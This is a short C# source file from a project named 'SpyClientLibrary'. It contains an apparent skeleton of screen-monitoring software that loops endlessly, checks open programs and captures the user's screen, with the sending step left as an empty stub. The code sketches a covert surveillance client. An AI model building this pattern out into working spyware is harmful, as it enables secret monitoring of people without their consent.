using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SpyClientLibrary
{
    public class Control
    {
        public TaskManager _taskmanager { get; set; }
        public User _user { get; set; }
        public Control()
        {

        }
        public void StartControl()
        {
            _user = new User();
            _taskmanager = new TaskManager();
            while(true)
            {
                if (!_taskmanager.CheckOpenPrograms())
                {
                    ScreenShot screen = new ScreenShot(_user);
                    screen.GenerateCurrentScreen();
                    SendScreeen(screen);
                }
            }
        }
        public void SendScreeen(ScreenShot screen)
        {
            var a = 0;
        }
    }
}
